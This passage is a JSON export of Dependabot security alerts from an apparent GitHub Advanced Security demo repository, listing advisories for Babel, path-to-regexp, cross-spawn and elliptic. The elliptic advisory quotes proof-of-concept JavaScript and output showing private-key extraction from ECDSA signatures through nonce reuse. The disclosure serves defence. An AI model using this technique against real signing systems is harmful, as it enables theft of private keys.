        "description": "### Impact\n\nWhen using Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), Babel will generate a polyfill for the `.replace` method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to `.replace`).\n\nYour generated code is vulnerable if _all_ the following conditions are true:\n- You use Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group)\n- You use the `.replace` method on a regular expression that contains named capturing groups\n- **Your code uses untrusted strings as the second argument of `.replace`**\n\nIf you are using `@babel/preset-env` with the [`targets`](https://babeljs.io/docs/options#targets) option, the transform that injects the vulnerable code is automatically enabled if:\n- you use [_duplicated_ named capturing groups](https://github.com/tc39/proposal-duplicate-named-capturing-groups), and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23\n- you use any [named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10\n\nYou can verify what transforms `@babel/preset-env` is using by enabling the [`debug` option](https://babeljs.io/docs/babel-preset-env#debug).\n\n\n### Patches\n\nThis problem has been fixed in `@babel/helpers` and `@babel/runtime` 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on `@babel/helpers`, and instead you depend on `@babel/core` (which itself depends on `@babel/helpers`). Upgrading to `@babel/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel/helpers` version.\n\nPlease note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.\n\n### Workarounds\n\nIf you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$<` if it's then not followed by `>` (possibly with other characters in between).\n\n### References\n\nThis vulnerability was reported and fixed in https://github.com/babel/babel/pull/17173.",
        "severity": "medium",
        "identifiers": [
          {
            "value": "GHSA-968p-4wvh-cqc8",
            "type": "GHSA"
          },
          {
            "value": "CVE-2025-27789",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173"
          },
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4"
          },
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-27789"
          },
          {
            "url": "https://github.com/advisories/GHSA-968p-4wvh-cqc8"
          }
        ],
        "published_at": "2025-03-11T20:30:18Z",
        "updated_at": "2025-04-16T15:39:52Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "@babel/helpers"
            },
            "severity": "medium",
            "vulnerable_version_range": "< 7.26.10",
            "first_patched_version": {
              "identifier": "7.26.10"
            }
          },
          {
            "package": {
              "ecosystem": "npm",
              "name": "@babel/runtime"
            },
            "severity": "medium",
            "vulnerable_version_range": "< 7.26.10",
            "first_patched_version": {
              "identifier": "7.26.10"
            }
          },
          {
            "package": {
              "ecosystem": "npm",
              "name": "@babel/runtime-corejs2"
            },
            "severity": "medium",
            "vulnerable_version_range": "< 7.26.10",
            "first_patched_version": {
              "identifier": "7.26.10"
            }
          },
          {
            "package": {
              "ecosystem": "npm",
              "name": "@babel/runtime-corejs3"
            },
            "severity": "medium",
            "vulnerable_version_range": "< 7.26.10",
            "first_patched_version": {
              "identifier": "7.26.10"
            }
          },
          {
            "package": {
              "ecosystem": "npm",
              "name": "@babel/helpers"
            },
            "severity": "medium",
            "vulnerable_version_range": ">= 8.0.0-alpha.0, < 8.0.0-alpha.16",
            "first_patched_version": {
              "identifier": "8.0.0-alpha.17"
            }
          },
          {
            "package": {
              "ecosystem": "npm",
              "name": "@babel/runtime"
            },
            "severity": "medium",
            "vulnerable_version_range": ">= 8.0.0-alpha.0, < 8.0.0-alpha.16",
            "first_patched_version": {
              "identifier": "8.0.0-alpha.17"
            }
          },
          {
            "package": {
              "ecosystem": "npm",
              "name": "@babel/runtime-corejs2"
            },
            "severity": "medium",
            "vulnerable_version_range": ">= 8.0.0-alpha.0, < 8.0.0-alpha.16",
            "first_patched_version": {
              "identifier": "8.0.0-alpha.17"
            }
          },
          {
            "package": {
              "ecosystem": "npm",
              "name": "@babel/runtime-corejs3"
            },
            "severity": "medium",
            "vulnerable_version_range": ">= 8.0.0-alpha.0, < 8.0.0-alpha.16",
            "first_patched_version": {
              "identifier": "8.0.0-alpha.17"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "score": 6.2
          },
          "cvss_v4": {
            "vector_string": null,
            "score": 0.0
          }
        },
        "epss": {
          "percentage": 0.0002,
          "percentile": 0.03728
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "score": 6.2
        },
        "cwes": [
          {
            "cwe_id": "CWE-1333",
            "name": "Inefficient Regular Expression Complexity"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "@babel/runtime"
        },
        "severity": "medium",
        "vulnerable_version_range": "< 7.26.10",
        "first_patched_version": {
          "identifier": "7.26.10"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/165",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/165",
      "created_at": "2025-06-02T13:38:22Z",
      "updated_at": "2025-06-02T13:38:22Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": "2025-06-02T13:38:22Z"
    },
    {
      "number": 164,
      "state": "auto_dismissed",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "@babel/helpers"
        },
        "manifest_path": "frontend/package-lock.json",
        "scope": "development",
        "relationship": "transitive"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-968p-4wvh-cqc8",
        "cve_id": "CVE-2025-27789",
        "summary": "Babel has inefficient RegExp complexity in generated code with .replace when transpiling named capturing groups",
        "description": "### Impact\n\nWhen using Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), Babel will generate a polyfill for the `.replace` method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to `.replace`).\n\nYour generated code is vulnerable if _all_ the following conditions are true:\n- You use Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group)\n- You use the `.replace` method on a regular expression that contains named capturing groups\n- **Your code uses untrusted strings as the second argument of `.replace`**\n\nIf you are using `@babel/preset-env` with the [`targets`](https://babeljs.io/docs/options#targets) option, the transform that injects the vulnerable code is automatically enabled if:\n- you use [_duplicated_ named capturing groups](https://github.com/tc39/proposal-duplicate-named-capturing-groups), and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23\n- you use any [named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10\n\nYou can verify what transforms `@babel/preset-env` is using by enabling the [`debug` option](https://babeljs.io/docs/babel-preset-env#debug).\n\n\n### Patches\n\nThis problem has been fixed in `@babel/helpers` and `@babel/runtime` 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on `@babel/helpers`, and instead you depend on `@babel/core` (which itself depends on `@babel/helpers`). Upgrading to `@babel/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel/helpers` version.\n\nPlease note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.\n\n### Workarounds\n\nIf you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$<` if it's then not followed by `>` (possibly with other characters in between).\n\n### References\n\nThis vulnerability was reported and fixed in https://github.com/babel/babel/pull/17173.",
        "severity": "medium",
        "identifiers": [
          {
            "value": "GHSA-968p-4wvh-cqc8",
            "type": "GHSA"
          },
          {
            "value": "CVE-2025-27789",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173"
          },
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4"
          },
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-27789"
          },
          {
            "url": "https://github.com/advisories/GHSA-968p-4wvh-cqc8"
          }
        ],
        "published_at": "2025-03-11T20:30:18Z",
        "updated_at": "2025-04-16T15:39:52Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "@babel/helpers"
            },
            "severity": "medium",
            "vulnerable_version_range": "< 7.26.10",
            "first_patched_version": {
              "identifier": "7.26.10"
            }
          },
          {
            "package": {
              "ecosystem": "npm",
              "name": "@babel/runtime"
            },
            "severity": "medium",
            "vulnerable_version_range": "< 7.26.10",
            "first_patched_version": {
              "identifier": "7.26.10"
            }
          },
          {
            "package": {
              "ecosystem": "npm",
              "name": "@babel/runtime-corejs2"
            },
            "severity": "medium",
            "vulnerable_version_range": "< 7.26.10",
            "first_patched_version": {
              "identifier": "7.26.10"
            }
          },
          {
            "package": {
              "ecosystem": "npm",
              "name": "@babel/runtime-corejs3"
            },
            "severity": "medium",
            "vulnerable_version_range": "< 7.26.10",
            "first_patched_version": {
              "identifier": "7.26.10"
            }
          },
          {
            "package": {
              "ecosystem": "npm",
              "name": "@babel/helpers"
            },
            "severity": "medium",
            "vulnerable_version_range": ">= 8.0.0-alpha.0, < 8.0.0-alpha.16",
            "first_patched_version": {
              "identifier": "8.0.0-alpha.17"
            }
          },
          {
            "package": {
              "ecosystem": "npm",
              "name": "@babel/runtime"
            },
            "severity": "medium",
            "vulnerable_version_range": ">= 8.0.0-alpha.0, < 8.0.0-alpha.16",
            "first_patched_version": {
              "identifier": "8.0.0-alpha.17"
            }
          },
          {
            "package": {
              "ecosystem": "npm",
              "name": "@babel/runtime-corejs2"
            },
            "severity": "medium",
            "vulnerable_version_range": ">= 8.0.0-alpha.0, < 8.0.0-alpha.16",
            "first_patched_version": {
              "identifier": "8.0.0-alpha.17"
            }
          },
          {
            "package": {
              "ecosystem": "npm",
              "name": "@babel/runtime-corejs3"
            },
            "severity": "medium",
            "vulnerable_version_range": ">= 8.0.0-alpha.0, < 8.0.0-alpha.16",
            "first_patched_version": {
              "identifier": "8.0.0-alpha.17"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "score": 6.2
          },
          "cvss_v4": {
            "vector_string": null,
            "score": 0.0
          }
        },
        "epss": {
          "percentage": 0.0002,
          "percentile": 0.03728
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "score": 6.2
        },
        "cwes": [
          {
            "cwe_id": "CWE-1333",
            "name": "Inefficient Regular Expression Complexity"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "@babel/helpers"
        },
        "severity": "medium",
        "vulnerable_version_range": "< 7.26.10",
        "first_patched_version": {
          "identifier": "7.26.10"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/164",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/164",
      "created_at": "2025-06-02T13:38:22Z",
      "updated_at": "2025-06-02T13:38:22Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": "2025-06-02T13:38:22Z"
    },
    {
      "number": 163,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "elliptic"
        },
        "manifest_path": "frontend/package-lock.json",
        "scope": "development",
        "relationship": "transitive"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-vjh7-7g9h-fjfh",
        "cve_id": null,
        "summary": "Elliptic's private key extraction in ECDSA upon signing a malformed input (e.g. a string)",
        "description": "### Summary\n\nPrivate key can be extracted from ECDSA signature upon signing a malformed input (e.g. a string or a number), which could e.g. come from JSON network input\n\nNote that `elliptic` by design accepts hex strings as one of the possible input types\n\n### Details\n\nIn this code: https://github.com/indutny/elliptic/blob/3e46a48fdd2ef2f89593e5e058d85530578c9761/lib/elliptic/ec/index.js#L100-L107\n\n`msg` is a BN instance after conversion, but `nonce` is an array, and different BN instances could generate equivalent arrays after conversion.\n\nMeaning that a same `nonce` could be generated for different messages used in signing process, leading to `k` reuse, leading to private key extraction from a pair of signatures\n\nSuch a message can be constructed for any already known message/signature pair, meaning that the attack needs only a single malicious message being signed for a full key extraction\n\nWhile signing unverified attacker-controlled messages would be problematic itself (and exploitation of this needs such a scenario), signing a single message still _should not_ leak the private key\n\nAlso, message validation could have the same bug (out of scope for this report, but could be possible in some situations), which makes this attack more likely when used in a chain\n\n### PoC\n\n#### `k` reuse example\n\n```js\nimport elliptic from 'elliptic'\n\nconst { ec: EC } = elliptic\n\nconst privateKey = crypto.getRandomValues(new Uint8Array(32))\nconst curve = 'ed25519' // or any other curve, e.g. secp256k1\nconst ec = new EC(curve)\nconst prettyprint = ({ r, s }) => `r: ${r}, s: ${s}`\nconst sig0 = prettyprint(ec.sign(Buffer.alloc(32, 1), privateKey)) // array of ones\nconst sig1 = prettyprint(ec.sign('01'.repeat(32), privateKey)) // same message in hex form\nconst sig2 = prettyprint(ec.sign('-' + '01'.repeat(32), privateKey)) // same `r`, different `s`\nconsole.log({ sig0, sig1, sig2 })\n```\n\n#### Full attack\n\nThis doesn't include code for generation/recovery on a purpose (bit it's rather trivial)\n\n```js\nimport elliptic from 'elliptic'\n\nconst { ec: EC } = elliptic\n\nconst privateKey = crypto.getRandomValues(new Uint8Array(32))\nconst curve = 'secp256k1' // or any other curve, e.g. ed25519\nconst ec = new EC(curve)\n\n// Any message, e.g. previously known signature\nconst msg0 = crypto.getRandomValues(new Uint8Array(32))\nconst sig0 = ec.sign(msg0, privateKey)\n\n// Attack\nconst msg1 = funny(msg0) // this is a string here, but can also be of other non-Uint8Array types\nconst sig1 = ec.sign(msg1, privateKey)\n\nconst something = extract(msg0, sig0, sig1, curve)\n\nconsole.log('Curve:', curve)\nconsole.log('Typeof:', typeof msg1)\nconsole.log('Keys equal?', Buffer.from(privateKey).toString('hex') === something)\nconst rnd = crypto.getRandomValues(new Uint8Array(32))\nconst st = (x) => JSON.stringify(x)\nconsole.log('Keys equivalent?', st(ec.sign(rnd, something).toDER()) === st(ec.sign(rnd, privateKey).toDER()))\nconsole.log('Orig key:', Buffer.from(privateKey).toString('hex'))\nconsole.log('Restored:', something)\n```\n\nOutput:\n```console\nCurve: secp256k1\nTypeof: string\nKeys equal? true\nKeys equivalent? true\nOrig key: c7870f7eb3e8fd5155d5c8cdfca61aa993eed1fbe5b41feef69a68303248c22a\nRestored: c7870f7eb3e8fd5155d5c8cdfca61aa993eed1fbe5b41feef69a68303248c22a\n```\n\nSimilar for `ed25519`, but due to low `n`, the key might not match precisely but is nevertheless equivalent for signing:\n```console\nCurve: ed25519\nTypeof: string\nKeys equal? false\nKeys equivalent? true\nOrig key: f1ce0e4395592f4de24f6423099e022925ad5d2d7039b614aaffdbb194a0d189\nRestored: 01ce0e4395592f4de24f6423099e0227ec9cb921e3b7858581ec0d26223966a6\n```\n`restored` is equal to `orig` mod `N`.\n\n### Impact\n\nFull private key extraction when signing a single malicious message (that passes `JSON.stringify`/`JSON.parse`)",
        "severity": "critical",
        "identifiers": [
          {
            "value": "GHSA-vjh7-7g9h-fjfh",
            "type": "GHSA"
          }
        ],
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/security/advisories/GHSA-vjh7-7g9h-fjfh"
          },
          {
            "url": "https://github.com/indutny/elliptic/commit/04cb6f54ce552b3ebde6be06d6050419e1c7333e"
          },
          {
            "url": "https://github.com/advisories/GHSA-vjh7-7g9h-fjfh"
          }
        ],
        "published_at": "2025-02-12T19:47:52Z",
        "updated_at": "2025-02-23T23:30:35Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "elliptic"
            },
            "severity": "critical",
            "vulnerable_version_range": "<= 6.6.0",
            "first_patched_version": {
              "identifier": "6.6.1"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": null,
            "score": 0.0
          },
          "cvss_v4": {
            "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:H/SA:N",
            "score": 9.0
          }
        },
        "cvss": {
          "vector_string": null,
          "score": 0.0
        },
        "cwes": [
          {
            "cwe_id": "CWE-200",
            "name": "Exposure of Sensitive Information to an Unauthorized Actor"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "elliptic"
        },
        "severity": "critical",
        "vulnerable_version_range": "<= 6.6.0",
        "first_patched_version": {
          "identifier": "6.6.1"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/163",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/163",
      "created_at": "2025-06-02T13:38:22Z",
      "updated_at": "2025-06-02T13:38:22Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 162,
      "state": "auto_dismissed",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "path-to-regexp"
        },
        "manifest_path": "frontend/package-lock.json",
        "scope": "development",
        "relationship": "transitive"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-rhx6-c78j-4q9w",
        "cve_id": "CVE-2024-52798",
        "summary": "path-to-regexp contains a ReDoS",
        "description": "### Impact\n\nThe regular expression that is vulnerable to backtracking can be generated in versions before 0.1.12 of `path-to-regexp`, originally reported in CVE-2024-45296\n\n### Patches\n\nUpgrade to 0.1.12.\n\n### Workarounds\n\nAvoid using two parameters within a single path segment, when the separator is not `.` (e.g. no `/:a-:b`). Alternatively, you can define the regex used for both parameters and ensure they do not overlap to allow backtracking.\n\n### References\n\n- https://github.com/advisories/GHSA-9wv6-86v2-598j\n- https://blakeembrey.com/posts/2024-09-web-redos/",
        "severity": "high",
        "identifiers": [
          {
            "value": "GHSA-rhx6-c78j-4q9w",
            "type": "GHSA"
          },
          {
            "value": "CVE-2024-52798",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-rhx6-c78j-4q9w"
          },
          {
            "url": "https://blakeembrey.com/posts/2024-09-web-redos"
          },
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-52798"
          },
          {
            "url": "https://github.com/pillarjs/path-to-regexp/commit/f01c26a013b1889f0c217c643964513acf17f6a4"
          },
          {
            "url": "https://security.netapp.com/advisory/ntap-20250124-0002"
          },
          {
            "url": "https://github.com/advisories/GHSA-rhx6-c78j-4q9w"
          }
        ],
        "published_at": "2024-12-05T22:40:47Z",
        "updated_at": "2025-06-03T14:30:57Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "path-to-regexp"
            },
            "severity": "high",
            "vulnerable_version_range": "< 0.1.12",
            "first_patched_version": {
              "identifier": "0.1.12"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "score": 7.5
          },
          "cvss_v4": {
            "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "score": 7.7
          }
        },
        "epss": {
          "percentage": 0.00041,
          "percentile": 0.1197
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "score": 7.5
        },
        "cwes": [
          {
            "cwe_id": "CWE-1333",
            "name": "Inefficient Regular Expression Complexity"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "path-to-regexp"
        },
        "severity": "high",
        "vulnerable_version_range": "< 0.1.12",
        "first_patched_version": {
          "identifier": "0.1.12"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/162",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/162",
      "created_at": "2025-06-02T13:38:22Z",
      "updated_at": "2025-06-02T13:38:22Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": "2025-06-02T13:38:22Z"
    },
    {
      "number": 161,
      "state": "auto_dismissed",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "cross-spawn"
        },
        "manifest_path": "frontend/package-lock.json",
        "scope": "development",
        "relationship": "transitive"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-3xgq-45jj-v275",
        "cve_id": "CVE-2024-21538",
        "summary": "Regular Expression Denial of Service (ReDoS) in cross-spawn",
        "description": "Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.",
        "severity": "high",
        "identifiers": [
          {
            "value": "GHSA-3xgq-45jj-v275",
            "type": "GHSA"
          },
          {
            "value": "CVE-2024-21538",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-21538"
          },
          {
            "url": "https://github.com/moxystudio/node-cross-spawn/pull/160"
          },
          {
            "url": "https://github.com/moxystudio/node-cross-spawn/commit/5ff3a07d9add449021d806e45c4168203aa833ff"
          },
          {
            "url": "https://github.com/moxystudio/node-cross-spawn/commit/640d391fde65388548601d95abedccc12943374f"
          },
          {
            "url": "https://security.snyk.io/vuln/SNYK-JS-CROSSSPAWN-8303230"
          },
          {
            "url": "https://github.com/moxystudio/node-cross-spawn/issues/165"
          },
          {
            "url": "https://github.com/moxystudio/node-cross-spawn/commit/d35c865b877d2f9ded7c1ed87521c2fdb689c8dd"
          },
          {
            "url": "https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8366349"
          },
          {
            "url": "https://github.com/advisories/GHSA-3xgq-45jj-v275"
          }
        ],
        "published_at": "2024-11-08T06:30:47Z",
        "updated_at": "2025-05-19T19:56:26Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "cross-spawn"
            },
            "severity": "high",
            "vulnerable_version_range": ">= 7.0.0, < 7.0.5",
            "first_patched_version": {
              "identifier": "7.0.5"
            }
          },
          {
            "package": {
              "ecosystem": "npm",
              "name": "cross-spawn"
            },
            "severity": "high",
            "vulnerable_version_range": "< 6.0.6",
            "first_patched_version": {
              "identifier": "6.0.6"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "score": 7.5
          },
          "cvss_v4": {
            "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "score": 7.7
          }
        },
        "epss": {
          "percentage": 0.00151,
          "percentile": 0.36889
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "score": 7.5
        },
        "cwes": [
          {
            "cwe_id": "CWE-1333",
            "name": "Inefficient Regular Expression Complexity"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "cross-spawn"
        },
        "severity": "high",
        "vulnerable_version_range": "< 6.0.6",
        "first_patched_version": {
          "identifier": "6.0.6"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/161",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/161",
      "created_at": "2025-06-02T13:38:21Z",
      "updated_at": "2025-06-02T13:38:22Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": "2025-06-02T13:38:22Z"
    },
    {
      "number": 160,
      "state": "auto_dismissed",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "cross-spawn"
        },
        "manifest_path": "frontend/package-lock.json",
        "scope": "development",
        "relationship": "transitive"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-3xgq-45jj-v275",
        "cve_id": "CVE-2024-21538",
        "summary": "Regular Expression Denial of Service (ReDoS) in cross-spawn",
        "description": "Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.",
        "severity": "high",
        "identifiers": [
          {
            "value": "GHSA-3xgq-45jj-v275",
            "type": "GHSA"
          },
          {
            "value": "CVE-2024-21538",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-21538"
          },
          {
            "url": "https://github.com/moxystudio/node-cross-spawn/pull/160"
          },
          {
            "url": "https://github.com/moxystudio/node-cross-spawn/commit/5ff3a07d9add449021d806e45c4168203aa833ff"
          },
          {
            "url": "https://github.com/moxystudio/node-cross-spawn/commit/640d391fde65388548601d95abedccc12943374f"
          },
          {
            "url": "https://security.snyk.io/vuln/SNYK-JS-CROSSSPAWN-8303230"
          },
          {
            "url": "https://github.com/moxystudio/node-cross-spawn/issues/165"
          },
          {
            "url": "https://github.com/moxystudio/node-cross-spawn/commit/d35c865b877d2f9ded7c1ed87521c2fdb689c8dd"
          },
          {
            "url": "https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8366349"
          },
          {
            "url": "https://github.com/advisories/GHSA-3xgq-45jj-v275"
          }
        ],
        "published_at": "2024-11-08T06:30:47Z",
        "updated_at": "2025-05-19T19:56:26Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "cross-spawn"
            },
            "severity": "high",
            "vulnerable_version_range": ">= 7.0.0, < 7.0.5",
            "first_patched_version": {
              "identifier": "7.0.5"
            }
          },
          {
            "package": {
              "ecosystem": "npm",
              "name": "cross-spawn"
            },
            "severity": "high",
            "vulnerable_version_range": "< 6.0.6",
            "first_patched_version": {
              "identifier": "6.0.6"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "score": 7.5
          },
          "cvss_v4": {
            "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "score": 7.7
          }
        },
        "epss": {
          "percentage": 0.00151,
          "percentile": 0.36889
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "score": 7.5
        },
        "cwes": [
          {
            "cwe_id": "CWE-1333",
            "name": "Inefficient Regular Expression Complexity"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "cross-spawn"
        },
        "severity": "high",
        "vulnerable_version_range": ">= 7.0.0, < 7.0.5",
        "first_patched_version": {
          "identifier": "7.0.5"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/160",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/160",
      "created_at": "2025-06-02T13:38:21Z",
      "updated_at": "2025-06-02T13:38:21Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": "2025-06-02T13:38:21Z"
    },
    {
      "number": 159,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "elliptic"
        },
        "manifest_path": "frontend/package-lock.json",
        "scope": "development",
        "relationship": "transitive"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-fc9h-whq2-v747",
        "cve_id": "CVE-2024-48948",
        "summary": "Valid ECDSA signatures erroneously rejected in Elliptic",
        "description": "The Elliptic prior to 6.6.0 for Node.js, in its for ECDSA implementation, does not correctly verify valid signatures if the hash contains at least four leading 0 bytes and when the order of the elliptic curve's base point is smaller than the hash, because of an _truncateToN anomaly. This leads to valid signatures being rejected. Legitimate transactions or communications may be incorrectly flagged as invalid.",
        "severity": "low",
        "identifiers": [
          {
            "value": "GHSA-fc9h-whq2-v747",
            "type": "GHSA"
          },
          {
            "value": "CVE-2024-48948",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-48948"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322"
          },
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf"
          },
          {
